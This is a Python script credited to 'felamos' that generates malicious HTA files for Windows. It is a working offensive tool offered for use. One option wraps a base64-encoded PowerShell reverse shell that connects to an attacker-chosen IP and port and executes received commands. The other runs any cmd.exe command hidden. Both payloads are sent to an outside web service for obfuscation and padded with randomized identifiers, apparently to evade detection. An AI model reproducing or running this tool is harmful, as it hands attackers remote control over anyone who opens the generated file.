#!/usr/bin/env python3

#Author: felamos

import base64
import os
import requests
import string
import random
import sys

def Main():
    def menu():
        print("""
1) Powershell Reverse Shell.
2) Custom Command. "Works much better"
        """)

    menu()
    option = int(input("> "))

    def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))

    def body(content):
        body = f"""<html>
        <head>
        <HTA:APPLICATION id="{id_generator()}"
        applicationName="{id_generator()}"
        border="thin"
        borderStyle="normal"
        caption="yes"
        icon="http://127.0.0.1/{id_generator()}.ico"
        maximizeButton="yes"
        minimizeButton="yes"
        showInTaskbar="no"
        windowState="normal"
        innerBorder="yes"
        navigable="yes"
        scroll="auto"
        scrollFlat="yes"
        singleInstance="yes"
        sysMenu="yes"
        contextMenu="yes"
        selection="yes"
        version="1.0" />
        <script>
        {content}
        </script>
        <title>{id_generator()}</title>
        </head>
        <body>
        <h1>{id_generator()}</h1>
        <hr>
        </body>
        </html>"""
        return body

    def encrypt(payload):
        api_url = "https://enigmatic-shore-46592.herokuapp.com/api/weirdhta"
        data = r"""{"code" : "%s"}""" % (payload.decode())
        header = {"Content-Type": "application/json"}
        r = requests.post(api_url, headers=header, data=data)
        return r.text

    def powershell(ip, port):
        #https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
        rev_b64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
        rev_plain = base64.b64decode(rev_b64).decode()
        rev = rev_plain.replace("SUPERIPA" , ip).replace("PORT", port)
        payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
        return payload

    if option == 1:
        ip = input("[*] Enter IP Address: ")
        port = input("[*] Enter PORT: ")
        payload = f"""
        a=new ActiveXObject("WScript.Shell");
        a.run("powershell -nop -w 1 -enc {powershell(ip, port)}", 0);window.close();
        """.encode()

        bpayload = base64.b64encode(payload)
        final = encrypt(bpayload)
        f = open('test.hta', 'w')
        f.write(body(final))
        f.close()
        print("[*] Written test.hta")

    elif option == 2:
        print("[*] Type your command... ")
        print("")
        cmd = input("> ")
        cmd = cmd.replace("\\" , "\\\\")
        cmd = f"cmd.exe /c {cmd}"
        payload = f"""
        a=new ActiveXObject("WScript.Shell");
        a.run("{cmd}", 0);window.close();
        """.encode()
        bpayload = base64.b64encode(payload)
        final = encrypt(bpayload)
        f = open('test.hta', 'w')
        f.write(body(final))
        f.close()
        print("[*] Written test.hta")

    else:
        sys.exit("Invalid")

if __name__ == "__main__":
    def banner():
        banner = """
 █     █░▓█████  ██▓ ██▀███  ▓█████▄     ██░ ██ ▄▄▄█████▓ ▄▄▄
▓█░ █ ░█░▓█   ▀ ▓██▒▓██ ▒ ██▒▒██▀ ██▌   ▓██░ ██▒▓  ██▒ ▓▒▒████▄
▒█░ █ ░█ ▒███   ▒██▒▓██ ░▄█ ▒░██   █▌   ▒██▀▀██░▒ ▓██░ ▒░▒██  ▀█▄
░█░ █ ░█ ▒▓█  ▄ ░██░▒██▀▀█▄  ░▓█▄   ▌   ░▓█ ░██ ░ ▓██▓ ░ ░██▄▄▄▄██
░░██▒██▓ ░▒████▒░██░░██▓ ▒██▒░▒████▓    ░▓█▒░██▓  ▒██▒ ░  ▓█   ▓██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▓  ░ ▒▓ ░▒▓░ ▒▒▓  ▒     ▒ ░░▒░▒  ▒ ░░    ▒▒   ▓▒█░
  ▒ ░ ░   ░ ░  ░ ▒ ░  ░▒ ░ ▒░ ░ ▒  ▒     ▒ ░▒░ ░    ░      ▒   ▒▒ ░
  ░   ░     ░    ▒ ░  ░░   ░  ░ ░  ░     ░  ░░ ░  ░        ░   ▒
    ░       ░  ░ ░     ░        ░        ░  ░  ░               ░  ░
                              ░
                                                    by felamos
        """
        print(banner)
    banner()
    try:
        Main()
    except Exception as e:
        sys.exit("Something went wrong")
